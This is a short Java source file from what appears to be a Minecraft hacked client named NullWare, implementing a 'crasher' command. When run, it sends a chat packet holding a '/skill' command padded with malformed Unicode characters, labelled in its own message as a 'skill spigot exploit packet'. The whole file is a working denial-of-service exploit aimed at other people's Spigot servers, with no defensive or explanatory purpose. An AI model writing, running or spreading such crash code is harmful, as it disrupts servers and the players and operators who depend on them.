package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class SkillSpigotCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        sendMessage("Sending skill spigot exploit packet...");
        mc.getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/skillč˝Ąă•ˇŕą‘â’Şç–µâ\u0090žňŽ‘©ŕ¤żć\u0090Ť â©ˇě‰Śá‹·ć¸źńĽ±Ťĺ ŻăŠ„ç«ąâš‚"));
    }
}